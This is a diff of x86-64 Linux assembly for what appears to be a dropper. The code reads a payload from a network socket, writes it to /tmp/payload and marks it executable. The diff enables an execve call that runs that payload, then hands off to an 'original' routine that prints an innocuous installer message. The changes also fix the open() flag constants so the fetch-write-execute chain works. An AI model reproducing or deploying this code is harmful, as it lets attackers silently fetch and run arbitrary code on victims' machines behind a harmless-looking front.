@@ -29,13 +29,6 @@ _start:
     ; above is opening a socket and connecting to it
     ; read bind_shell.asm to understand better it
 
-    ; write(socketfd, request, length)   
-    mov rax, 1 
-    mov rdi, rbx
-    lea rsi, [rel request]
-    mov rdx, request_end - request
-    syscall
-
     ; read(socketfd, buffer, length)
     xor rax, rax
     mov rdi, rbx
@@ -48,18 +41,18 @@ _start:
     ; open("/tmp/payload", O_CREAT|O_WRONLY|O_TRUNC, 0755)
     mov rax, 2
     lea rdi, [rel path]
-    ; O_CREAT = 512 (create file)
+    ; O_CREAT = 64 (create file)
     ; O_WRONLY = 1 (write file)
-    ; O_TRUNC = 1024 (remove old content 
-    mov rsi, 1537
-    mov rdx, 0755 ; make executable
+    ; O_TRUNC = 512 (remove old content 
+    mov rsi, 577
+    mov rdx, 0o0755 ; make executable
     syscall ; rax will have filefd
     mov r12, rax ; save filefd in r12
 
     ; fchmod(filefd, 0755)
     mov rax, 91
     mov rdi, r12
-    mov rsi, 0755
+    mov rsi, 0o0755
     syscall
     
     ; write(filefd, buffer, bytes_read)
@@ -79,7 +72,6 @@ _start:
     mov rdi, rbx
     syscall
 
-    %if 0
     ; execve("/tmp/payload", ["/tmp/payload", null], null)
     xor rax, rax
     push rax
@@ -89,7 +81,6 @@ _start:
     xor rdx, rdx
     mov rax, 59
     syscall
-    %endif
 
 original:
     mov rax, 1 ; sys_write
@@ -104,10 +95,6 @@ original:
 text:
     db "installing dead beef...", 0x0A
 text_end:
-
-request:
-    db "GET /payload HTTP/1.1", 0x0D, 0x0A, 0x0D, 0x0A ; "GET /payload HTTP/1.1\r\n\r\n"
-request_end:
 
 path:
     db "/tmp/payload", 0
